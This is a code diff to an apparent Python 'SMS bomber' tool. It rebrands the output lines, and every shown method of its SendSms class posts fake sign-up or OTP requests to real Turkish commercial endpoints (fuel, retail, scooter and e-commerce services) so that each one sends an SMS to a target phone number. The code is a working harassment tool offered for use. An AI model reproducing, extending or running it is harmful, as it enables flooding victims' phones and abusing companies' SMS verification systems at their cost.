@@ -549,12 +549,12 @@ class SendSms():
             json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
             r = requests.post(url, json=json)
             if (r.json()["phoneNumber"]) == str(self.phone):
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr || yıldırımLord/Papatya SMS Bomber")
             
              
     #mogazmobilapinew.aygaz.com.tr
@@ -564,12 +564,12 @@ class SendSms():
             json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
             r = requests.post(url, json=json)
             if (r.json()["messageCode"]) == "OK":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #ipragaz.com.tr
@@ -577,12 +577,12 @@ class SendSms():
         try:
             r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
             if (r.json()["data"]["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #petrolofisi.com.tr
@@ -593,12 +593,12 @@ class SendSms():
             json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 204:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #totalistasyonlari.com.tr
@@ -606,12 +606,12 @@ class SendSms():
         try:
             r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
             if (r.json()["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #opet.com.tr
@@ -621,12 +621,12 @@ class SendSms():
             json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
             r = requests.post(url, json=json)
             if (r.status_code) == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr || yıldırımLord/Papatya SMS Bomber")
 
 
     #dolap.com
@@ -637,12 +637,12 @@ class SendSms():
             json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
             r = requests.put(url, headers=headers, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com || yıldırımLord/Papatya SMS Bomber")
             
 
     #heymobility.tech
@@ -651,12 +651,12 @@ class SendSms():
             headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
             r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
             if (r.json()["IsSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech || yıldırımLord/Papatya SMS Bomber")
             
 
     #tazi.tech
@@ -667,12 +667,12 @@ class SendSms():
             json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
             r = requests.post(url, headers=headers, json=json)
             if (r.json()["kod"]) == "0000":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech || yıldırımLord/Papatya SMS Bomber")
             
     
     #isbike.istanbul
@@ -683,12 +683,12 @@ class SendSms():
             json={"cep_tel": self.phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
             r = requests.post(url, headers=headers, json=json)
             if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul || yıldırımLord/Papatya SMS Bomber")
             
     
     #n11.com
@@ -699,12 +699,12 @@ class SendSms():
             json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
             r = requests.post(url, headers=headers, json=json)
             if (r.json()["isSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #joker.com.tr
@@ -715,12 +715,12 @@ class SendSms():
             data = {"phone": self.phone}
             r = requests.post(url, headers=headers, data=data)
             if (r.json()["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr || yıldırımLord/Papatya SMS Bomber")
 
 
     #e-bebek.com
@@ -733,12 +733,12 @@ class SendSms():
             json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["status"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com || yıldırımLord/Papatya SMS Bomber")
 
 
     #sakasu.com.tr
@@ -748,12 +748,12 @@ class SendSms():
             json={"gsm": self.phone}
             r = requests.post(url, json=json)
             if (r.json()["status"]) == 1 :
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #gofody.com
@@ -763,12 +763,12 @@ class SendSms():
             json={"country_code": "90", "phone": self.phone}
             r = requests.post(url, json=json)
             if (r.json()["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com || yıldırımLord/Papatya SMS Bomber")
 
 
     #madamecoco.com
@@ -779,12 +779,12 @@ class SendSms():
             data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
             r = requests.post(url, headers=headers, data=data)
             if (r.status_code) == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com || yıldırımLord/Papatya SMS Bomber")
             
             
     #balikesiruludag.com.tr
@@ -792,12 +792,12 @@ class SendSms():
         try:
             r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={self.phone}")
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr")   
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr || yıldırımLord/Papatya SMS Bomber")   
             
     
     #evidea.com
@@ -808,12 +808,12 @@ class SendSms():
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data)      
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #koctas.com.tr
@@ -823,12 +823,12 @@ class SendSms():
             data = {"givePermission": "true", "mobileNumber": self.phone}
             r = requests.post(url, data=data)
             if (r.json()["status"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #gratis.com
@@ -840,12 +840,12 @@ class SendSms():
             json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": self.phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
             r = requests.post(url, headers=headers, json=json)
             if (r.status_code) == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com || yıldırımLord/Papatya SMS Bomber")
     
     
     #anadolu.com.tr
@@ -854,12 +854,12 @@ class SendSms():
             url = f"https://www.anadolu.com.tr:443/mobil/OneriSms2.php?Numara={self.phone}&NAME=Memati%20Bas"
             r = requests.get(url)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #accordors.com
@@ -869,12 +869,12 @@ class SendSms():
             json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
             r = requests.post(url, json=json)
             if r.json()["data"]:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com || yıldırımLord/Papatya SMS Bomber")
             
         
     #marti.tech
@@ -884,12 +884,12 @@ class SendSms():
             json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
             r = requests.post(url,  json=json)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #hoplagit.com
@@ -899,12 +899,12 @@ class SendSms():
             json={"phone": f"+90{self.phone}"}
             r = requests.post(url,  json=json)
             if r.status_code == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #gokarma.app
@@ -914,9 +914,9 @@ class SendSms():
             json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
             r = requests.post(url,  json=json)
             if r.status_code == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app || yıldırımLord/Papatya SMS Bomber")
